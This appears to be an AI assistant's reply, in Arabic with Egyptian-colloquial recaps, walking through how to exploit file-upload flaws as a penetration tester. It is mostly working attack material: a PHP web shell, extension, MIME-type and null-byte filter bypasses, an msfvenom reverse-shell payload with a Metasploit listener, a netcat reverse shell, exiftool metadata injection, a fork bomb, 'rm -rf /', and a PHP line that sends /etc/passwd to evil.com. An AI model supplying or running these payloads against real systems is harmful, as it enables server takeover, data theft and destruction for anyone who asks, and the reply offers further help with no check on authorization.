تمام، هشرحلك موضوع "Uploading and Executing Malicious Files" بعمق كـ Pentester، مع تركيز على الجانب العملي والأكواد والأوامر، وهحط الخلاصة بالعامية المصرية بعد كل جزء، وبعدين هعدلك كل السيناريوهات الممكنة للاستغلال.

---

### **1. مفهوم Uploading and Executing Malicious Files بعمق**
المقصود هنا إنك كـ Pentester بتحاول ترفع ملف "خبيث" (يعني فيه كود أو برنامج مضر) على سيرفر أو نظام، وبعدين تخليه يتنفذ (يتعمل Run) عشان تحقق هدفك، زي التحكم في السيرفر أو سرقة بيانات. المشكلة دي بتحصل لما النظام بيسمحلك ترفع ملفات من غير ما يفحصها كويس أو يمنع تنفيذها.

**النقاط الأساسية:**
- **Upload:** عملية رفع الملف (زي صورة، PDF، أو سكربت) للسيرفر.
- **Execution:** لما الملف ده يتنفذ ككود أو برنامج على السيرفر أو جهاز الضحية.
- **الثغرة:** لو الموقع ما عندوش فلترة قوية على نوع الملفات أو بيسمح بتنفيذها من غير ما يقفل الميزة دي.

**خلاصة بالعامية:**  
يعني لو الموقع بيخليك ترفع أي حاجة من غير ما يقول "استنى شوية نشوف دي ايه"، وكمان بيفتحها أو يشتغلها بنفسه، يبقى إنت ممكن ترفع حاجة تخربله الدنيا.

---

### **2. الجانب العملي: ازاي بنستغل الثغرة دي**
هنشرح الخطوات والطرق الشائعة مع أمثلة عملية:

#### **أ. رفع ملفات سكربت (مثل PHP Shell)**
كتير من المواقع بتسمح برفع ملفات (زي صور البروفايل أو المرفقات)، لو ما بتفحصش امتداد الملف أو بتسمح بتنفيذه، بنقدر نرفع شيل.

- **مثال عملي:**
  اعمل ملف PHP بسيط كده (اسمه مثلاً `shell.php`):
  ```
  <?php system($_GET['cmd']); ?>
  ```
  ده ملف لما ترفعه وتوصله بـ URL زي:
  ```
  http://target.com/uploads/shell.php?cmd=whoami
  ```
  هيرجعلك اسم المستخدم اللي السيرفر شغال بيه.

- **خطوات الاستغلال:**
  1. ابحث عن مكان رفع ملفات في الموقع (زي رفع صورة بروفايل).
  2. جرب ترفع الملف العادي (`shell.php`).
  3. لو الموقع بيرفض الـ `.php`، غير الامتداد لـ `.php5` أو `.phtml` أو حتى `.php.jpg` (Double Extension).
  4. استخدم أداة زي **Burp Suite** عشان تعدل الـ MIME Type في الـ Request لـ `application/octet-stream` بدل `image/jpeg`.
  5. لو اتقبل، افتح اللينك اللي الملف اترفع عليه وجرب أوامر.

- **أمر عملي كـ Pentester:**
  لو الملف اترفع على `http://target.com/uploads/shell.php`， جرب:
  ```
  http://target.com/uploads/shell.php?cmd=dir
  ```
  لو رجعلك ملفات السيرفر، يبقى الثغرة شغالة.

**خلاصة بالعامية:**  
لو الموقع سابك ترفع سكربت ونفذه، يبقى كأنك حطيت مفتاح الباب في جيبك وتقدر تعمل أي حاجة.

#### **ب. استغلال فلاتر ضعيفة (Bypass File Upload Restrictions)**
كتير من المواقع بتحط فلاتر (زي "الملف لازم يكون صورة بس")، لكن الفلاتر دي ممكن تتخطى.

- **مثال عملي:**
  لو الموقع بيقبل بس `.jpg`، اعمل ملف كده (اسمه `evil.jpg`):
  ```
  <?php system('whoami'); ?>
  ```
  وعدل الـ HTTP Request في Burp Suite:
  - غير الـ Content-Type لـ `image/jpeg`.
  - أو أضف Null Byte في الاسم: `evil.jpg%00.php`.

- **اختبار عملي:**
  جرب ترفع ملف بامتدادات مختلفة:
  ```
  shell.php
  shell.php5
  shell.PhP (Case Sensitivity)
  shell.jpg.php
  ```
  لو الموقع بيسمح بتنفيذ أي حاجة من دول، هتبقى ثغرة.

**خلاصة بالعامية:**  
الموقع لو بيقولك "ارفع صور بس" بس ما بيفحصش كويس، ممكن تلبسه صورة مزيفة جواها سكربت ويشتغل عادي.

#### **ج. رفع ملفات تنفيذية (Executable Files)**
لو السيرفر بيسمح برفع ملفات زي `.exe` أو شيل عكسي وينفذها، بنقدر نتحكم كامل.

- **مثال عملي:**
  اعمل شيل عكسي بـ **msfvenom**:
  ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o evil.exe
  ```
  - ارفعه على الموقع لو لقيت حقل ملفات مفتوح.
  - نفذه يدويًا لو ليك وصول (مثلاً عن طريق Command Injection).
  - استمع على الـ **Metasploit**:
  ```
  use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST 10.10.10.10
  set LPORT 4444
  exploit
  ```

- **أمر عملي كـ Pentester:**
  لو الموقع بيسمح برفع `.exe`، جرب ترفع ملف بسيط زي `calc.exe` وشوف لو اتفتحت الآلة الحاسبة على السيرفر.

**خلاصة بالعامية:**  
لو الموقع بيخليك ترفع برنامج ويشتغله، يبقى كأنك قولتله "خد البندقية دي واضرب نفسك بيها".

#### **د. استغلال ملفات غير متوقعة (PDFs, Images)**
حتى الملفات اللي المفروض آمنة زي الصور أو PDF ممكن تكون فيها ثغرات.

- **مثال عملي:**
  اعمل صورة مضروبة بكود PHP داخلها:
  ```
  exiftool -Comment="<?php system('whoami'); ?>" image.jpg
  ```
  ارفعها، ولو السيرفر بينفذ الـ Metadata، هتشتغل.

- **اختبار عملي:**
  جرب تضيف كود JavaScript في PDF:
  ```
  app.alert("Hacked!");
  ```
  لو الموقع بيفتح الـ PDF في المتصفح من غير Sanitization، الكود هيتنفذ.

**خلاصة بالعامية:**  
حتى لو الموقع بيقولك "ارفع صورة أو PDF بس"، ممكن تخبي فيهم حاجة خبيثة ويشتغلوا عادي لو ما فيش حماية.

---

### **3. سيناريوهات الاستغلال الممكنة كـ Pentester**
دلوقتي هعدلك كل الطرق اللي ممكن تستغل بيها الثغرة دي:

1. **Web Shell Upload:**
   - رفع شيل PHP (`<?php system($_GET['cmd']); ?>`) والتحكم في السيرفر.
   - استخدام أوامر زي `ls` أو `dir` أو حتى رفع شيل أكبر.

2. **Reverse Shell:**
   - رفع ملف `.php` أو `.exe` يفتح اتصال عكسي (`nc -e /bin/sh 10.10.10.10 4444`).
   - السيطرة الكاملة على السيرفر.

3. **Bypass Restrictions:**
   - استخدام Double Extensions (`shell.php.jpg`).
   - تغيير الـ MIME Type في الـ Request.
   - استخدام Null Byte (`shell.php%00.jpg`).

4. **Malicious Media:**
   - تضمين كود في صورة (`exiftool` مع PHP).
   - كود JavaScript في PDF أو Word يتنفذ لما يتفتح.

5. **Privilege Escalation:**
   - لو السيرفر بينفذ الملف بصلاحيات عالية، ممكن ترفع سكربت يعدل ملفات النظام (زي `/etc/passwd`).

6. **DDoS أو تدمير:**
   - رفع ملف يعمل Fork Bomb (`:(){ :|:& };:` في Linux) يعلق السيرفر.
   - أو ملف يحذف كل حاجة (`rm -rf /`).

7. **Data Exfiltration:**
   - رفع سكربت يسرق بيانات ويبعتها ليك:
   ```
   <?php file_get_contents('http://evil.com/log.php?data='.base64_encode(file_get_contents('/etc/passwd'))); ?>
   ```

---

### **نصيحة كـ Pentester:**
- استخدم **Burp Suite** عشان تعدل الـ Requests وتجرب امتدادات مختلفة.
- جرب كل أنواع الملفات (PHP, ASP, EXE, JPG, PDF) وشوف ايه اللي بيعدي.
- لو لقيت الملف اترفع بس ما بيتنفذش، ابحث عن طريقة ثانية (زي Command Injection) عشان تفعله.
- دايمًا احفظ اللينك اللي الملف اترفع عليه وجرب تتصل بيه.

لو عايز تفاصيل أكتر عن أي سيناريو أو أداة، قوللي!